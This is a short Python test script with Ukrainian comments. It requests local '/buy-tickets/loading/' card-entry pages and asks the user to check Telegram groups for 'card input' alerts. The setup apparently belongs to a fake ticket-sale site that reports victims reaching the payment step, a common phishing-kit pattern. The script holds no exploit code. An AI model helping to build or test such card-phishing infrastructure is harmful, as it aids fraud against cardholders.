#!/usr/bin/env python3

import requests
import time

def test_card_input_logging():
    """Тестує логування сторінки введення карти"""
    
    print("🧪 Тестуємо логування сторінки введення карти...")
    
    # Тестуємо різні варіанти URL для сторінки введення карти
    test_urls = [
        "http://localhost:8080/buy-tickets/loading/?page=2-29&total=45&currency=EUR",
        "http://localhost:8080/buy-tickets/loading/?page=1-15&total=30&currency=USD",
        "http://localhost:8080/buy-tickets/loading/?page=3-42&total=60&currency=EUR"
    ]
    
    for i, url in enumerate(test_urls, 1):
        print(f"\n📝 Тест {i}: {url}")
        try:
            response = requests.get(url, timeout=5)
            if response.status_code == 200:
                print(f"✅ Успішно: статус {response.status_code}")
                print(f"📄 Розмір відповіді: {len(response.content)} байт")
            else:
                print(f"⚠️  Неочікуваний статус: {response.status_code}")
        except requests.exceptions.ConnectionError:
            print("❌ Помилка з'єднання: сервер не запущений")
        except Exception as e:
            print(f"❌ Помилка: {e}")
        
        time.sleep(1)  # Пауза між запитами
    
    print("\n🎯 Тестування завершено!")
    print("📱 Перевірте Telegram групи на наявність повідомлень про 'Ввод карты'")

if __name__ == "__main__":
    test_card_input_logging()
